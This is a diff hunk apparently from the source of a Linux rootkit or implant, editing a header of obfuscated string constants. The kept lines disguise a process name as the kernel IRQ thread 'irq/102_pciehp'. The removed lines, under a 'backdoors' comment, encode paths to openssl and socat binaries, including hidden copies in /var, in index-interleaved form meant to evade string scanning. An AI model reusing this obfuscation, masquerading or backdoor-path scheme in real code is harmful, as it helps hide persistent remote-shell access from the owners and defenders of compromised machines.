@@ -91,27 +91,6 @@
 /** irq/102_pciehp */
 #define _OBF_IRQ_102_PCIEHP "\000i\001r\002q\003/\0041\0050\0062\007_\010p"    \
                             "\011c\012i\013e\014h\015p"
-/**
- * backdoors
- */
-/* /usr/bin/openssl */
-#define _OBF_USR_BIN_OPENSSL  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011o\012p\013e\014n\015s\016s\017l"
-
-/* /bin/openssl */
-#define _OBF_BIN_OPENSSL  "\000/\001b\002i\003n\004/\005o\006p\007e\010n\011s\012s\013l"
-
-/* /var/.openssl */
-#define _OBF_VAR_OPENSSL  "\000/\001v\002a\003r\004/\005.\006o\007p\010e\011n\012s\013s\014l"
-
-/* /usr/bin/socat */
-#define _OBF_USR_BIN_SOCAT  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011s\012o\013c\014a\015t"
-
-/* /bin/socat */
-#define _OBF_BIN_SOCAT  "\000/\001b\002i\003n\004/\005s\006o\007c\010a\011t"
-
-/* /var/.socat */
-#define _OBF_VAR_SOCAT  "\000/\001v\002a\003r\004/\005.\006s\007o\010c\011a\012t"
-
 /*
  * Other function addresses
  */
